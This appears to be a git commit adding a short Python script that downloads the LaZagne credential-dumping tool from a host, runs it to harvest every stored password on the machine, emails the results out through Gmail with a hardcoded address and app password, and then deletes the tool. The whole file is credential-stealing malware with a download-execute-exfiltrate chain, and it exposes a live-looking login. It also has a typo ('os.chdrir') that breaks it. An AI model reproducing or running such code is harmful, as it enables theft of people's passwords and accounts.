ebbc954bbb1e146c04241e0332342d5e835c3ad5
Chukwuji Obinna <82438612+swarzzywestly@users.noreply.github.com>
2023-10-28 06:56:34 +0100

    Add files via upload

---
+++ download_execute_report.py
@@ -0,0 +1,29 @@
+import subprocess
+
+import requests
+import smtplib
+import os
+import tempfile
+import subprocess
+
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.ehlo()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+temp_directory = tempfile.gettempdir()
+os.chdrir(temp_directory)
+download("http://10.0.2.16/my_files/LaZagne.exe")
+result = subprocess.check_output("LaZagne.exe all", shell=True)
+send_mail("obylywest777@gmail.com", "kmnalsbhqmscrugo", result)
+os.remove("LaZagne.exe")
